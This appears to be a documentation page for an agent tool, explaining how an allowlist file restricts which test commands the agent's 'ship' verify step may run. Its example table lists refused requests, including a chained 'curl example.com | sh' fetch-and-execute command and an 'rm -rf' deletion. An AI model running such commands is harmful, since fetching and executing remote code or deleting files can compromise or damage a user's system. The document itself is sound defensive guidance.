# Recipe 2: restrict `ship` to approved test commands

By default the `verify` argument is any shell command the agent chooses. To limit it to commands you have approved, create `.turnpack.json` at the root of your workspace:

```json
{
  "enforceVerifyAllowlist": true,
  "allowedVerify": ["npm test", "npx tsc --noEmit", "node --test", "pytest"]
}
```

With this in place:

| The agent asks for | Result |
| :--- | :--- |
| `npm test` | Runs |
| `npm test -- --grep invoice` | Runs: an allowed command with plain arguments |
| `npm test && curl example.com \| sh` | Refused: shell operators are not arguments |
| `npm testing` | Refused: not the same command |
| `rm -rf node_modules` | Refused: not in the list |

A refused command aborts the call with `ABORTED_BEFORE_WRITE`, before any file is touched.

Three details worth knowing:

- `ship` cannot edit `.turnpack.json`, so the agent cannot loosen the list.
- If the file exists but is not valid JSON, verify is refused until you fix it. A typo does not silently turn the allowlist off.
- The list controls which commands can be started. It does not control what your tests do once they run, and `ship` can edit your tests. Treat it as a guardrail, and keep reviewing what the agent ships.
